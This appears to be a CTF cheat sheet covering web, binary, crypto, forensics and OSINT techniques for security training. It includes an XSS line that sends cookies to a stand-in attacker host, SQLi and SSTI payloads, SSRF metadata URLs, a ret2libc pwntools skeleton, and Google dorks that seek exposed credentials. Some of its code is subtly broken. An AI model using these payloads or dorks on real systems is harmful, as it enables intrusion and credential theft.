# CTF (Capture The Flag) — Jeopardy Style

Competitve security challenge format with categories across web, pwn, crypto, reversing, forensics, and OSINT.

## Core Categories

| Category | What It Tests | Key Skills |
|----------|--------------|------------|
| **Web** | Exploiting web vulnerabilities | XSS, SQLi, SSRF, auth bypass, SSTI, race conditions |
| **Pwn (Binary Exploitation)** | Finding and exploiting binary vulnerabilities | Buffer overflow, ROP, format string, heap exploits |
| **Reversing** | Analyzing compiled programs | Disassembly, debugging, decompilation |
| **Crypto** | Breaking or misuse of cryptographic systems | RSA attacks, AES attacks, hash length extension, ECB oracles |
| **Forensics** | Analyzing captured files/disks/memory | File carvers, steganography, memory analysis, log analysis |
| **OSINT** | Open-source intelligence gathering | DNS records, breach dumps, Google dorking, metadata analysis |
| **Mobile** | Android/iOS application security | APK analysis, Frida hooking, bytecode review |

## Web Exploitation

### Common Web Challenges

```bash
# SQL Injection — find the query, exfiltrate data
# classic: ' OR 1=1 -- (unions, stacked queries, blind)
# Tool: sqlmap -r request.txt --batch --dbs

# XSS — steal cookies via listener
# <script>document.location='https://attacker.com/?c='+document.cookie</script>
# Blind XSS: use xsshunter.com or interact.sh as callback

# SSRF — fetch internal metadata
# http://169.254.169.254/latest/meta-data/ (AWS)
# http://metadata.google.internal/ (GCP)

# SSTI (Server-Side Template Injection)
# {{7*7}} → {{config}} → {{request.application}}
# Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}

# File upload bypass
# filename.php → filename.phtml, filename.php5, filename.jpg.php
# Content-Type: image/png → GIF89a (magic bytes bypass)
# Path traversal: ../../etc/passwd
```

### Auth Bypass Patterns

| Technique | When to Use |
|-----------|------------|
| `admin'--` | SQL authentication bypass |
| `admin' or '1'='1` | Classic SQLi on login |
| Forceful browsing | Direct object reference on hidden pages |
| JWT manipulation | None algorithm, kid injection, key confusion |
| Cookie tampering | Plaintext or weakly signed cookies |
| OTP reuse | Same OTP for multiple attempts |

### JWT Attacks

```bash
# Basic JWT structure: header.payload.signature (base64url)
# None algorithm: change "alg": "HS256" → "alg": "none"
# Header: {"alg":"none","typ":"JWT"} → eyJhbGciOiJub25lIn0=

# HS256 key confusion: switch alg to HS256, sign with the 
# application's public RSA key (kid: "../../public.pem")

# Cracking weak keys
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

## Binary Exploitation (Pwn)

### Buffer Overflow (Stack)

```python
# Finding offset with pattern create
# pattern create 200
# pattern offset $eip
# Then: payload = offset * "A" + ROP_chain + padding

# Exploit skeleton (ret2libc on Linux x86)
from pwn import *

context.binary = './vulnerable_binary'
p = process()
# Leak libc address
p.sendline(b"2")  # trigger leak
p.recvuntil(b" leaked: ")
leak = int(p.recvline().strip(), 16)
libc_base = leak - 0x1b3a80  # offset from libc database
system = libc_base + 0x4a4e0
binsh = libc_base + 0x1b45a5

# Build ROP chain
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
p.sendline(b"1")
p.sendline(b"A"*64 + rop.chain())
p.interactive()
```

### Format String Vulnerability

```bash
# Check: printf("%s") → printf(user_input)
# Exploit: %x %x %x %x to leak stack
# %p %p %p %p %p %p %p %p (8 pointers)
# Write anywhere: %n (writes 4 bytes)
# Use: %4213424c to write 0x41 ('A') at address
# Payload: (address).format(h) + "%085x%n" → writes to address
```

### ROP (Return-Oriented Programming)

```bash
# Find gadgets: ROPgadget --binary ./binary > gadgets.txt
# or: ropper --file ./binary -- gadgets

# Common gadgets:
# pop; pop; ret (adjust stack)
# mov [reg], reg; ret (write to memory)
# leave; ret (frame pivot)

# Example: ret2libc with ASLR
# 1. Leak libc address via puts/printf
# 2. Calculate libc base
# 3. Find system('/bin/sh') in libc
# 4. ROP chain: pop rdi; ret → "/bin/sh" → system → ret
```

### Heap Exploits

| Attack | Description | Use When |
|--------|-------------|----------|
| **Fastbin dup** | Reorder fastbin freelist for arbitrary alloc | Heap with fastbin-sized chunks |
| **House of Spirit** | Fake chunk in register, free it, then allocate | Can control stack pointer |
| **Unsorted bin leak** | Leak heap address from unsorted bin | ASLR bypass using leaks |
| **Tcache poisoning** | Overwrite next pointer in tcache chunk | GLIBC 2.26+ with tcache enabled |

## Cryptography

### Classic Crypto Attacks

```python
# ECB oracle (encrypt arbitrary data, observe result)
# Feed: prefix || attacker_controlled || target_block
# Pattern: identical blocks = same plaintext

# Hash length extension
# MD5(key || message) known; extend to message || attacker_controlled
# Use: hashpump (hash_extender)

# RSA attacks
# e=3 small exponent: cube root attack (if message < N^(1/e))
# e=65537 but n weak: Wiener's attack (d < N^0.292)
# Same padding (PKCS#1 v1.5): Bleichenbacher oracle
# Same n, different e: Hastad's broadcast attack

# CBC bit flipping
# Flip bits in IV to manipulate plaintext
# Byte flip: ciphertext[block_i][j] ^= old_bit ^ new_bit
```

### AES Modes

| Mode | Weakness | Exploit |
|------|----------|---------|
| ECB | Identical blocks leak pattern | Cut/paste blocks |
| CBC | Bit flipping (IV manipulation) | Flip IV bits to get target plaintext |
| CTR | Nonce reuse | XOR two ciphertexts to get plaintext XOR |
| GCM | Nonce reuse | nonce_reuse == catastrophic (auth key compromise) |

## Forensics

### File Carving & Analysis

```bash
# Identify file type (magic bytes)
file suspicious.bin

# Extract images/audio from disk image
binwalk -e disk.img
# or: foremost -v disk.img

# Check PNG steganography
zsteg -a image.png
steghide extract -sf image.jpg

# Extract from pcap (USB keyboard data, reassemble TCP streams)
# USB: filter "usb.capdata" and decode scancodes
# streams: follow TCP stream in Wireshark
```

### Memory Forensics

```bash
# Profile for memory image
volatility -f memory.dmp imageinfo

# Timeline (processes, connections, registry timeline)
volatility -f memory.dmp --profile=Win10x64 timeline > timeline.txt

# Retrieve browser history
volatility -f memory.dmp --profile=Win10x64 chromehistory

# Detect malicious process injection
volatility -f memory.dmp --profile=Win10x64 malfind
```

### Log Analysis

```bash
# Find failed SSH attempts
grep -i "failed" /var/log/auth.log | tail -50

# Detect webshell in access logs
grep -E "eval|base64_decode|exec\(" access.log

# timeline of events from multiple logs
grep -h "^\w+ \d+ \d+:\d+:\d+" auth.log syslog kern.log | sort -t' ' -k2,3 | head -100
```

## OSINT

### Search Operators

```bash
# Google dorking
site:github.com "password="
site:pastebin.com "api_key"
filetype:sql "INSERT INTO"
intitle:"index of" "config.php"
inurl:"wp-content" "wp-config.php.bak"
"internal use only" site:*.mil

# DNS/Subdomain enumeration
dig a domain.com +short
subfinder -d example.com
amass enum -passive -d example.com

# Breach data
# HaveIBeenPwned: check if email in breaches
# dehashed: search leaked credentials
# leakcheck.io: check domain in breaches
```

## CTF Workflow

```
1. Scan/enumerate (nmap -sC -sV -p- target)
2. Enumerate web (gobuster dir -u target -w /usr/share/wordlists/dirb/common.txt)
3. Find vulnerability in target
4. Exploit
5. Escalate if needed
6. Capture flag
7. Document (screenshot, writeup)
```

**Essential tools:**
- pwntools (Python CTF framework)
- GDB + pwndbg (binary debugging)
- Radare2 / Rizin (reversing)
- CyberChef (encoding/decodingSwiss army knife)
- Ghidra (disassembly)
- Burp Suite + sqlmap (web)
- Wireshark + tshark (network/forensics)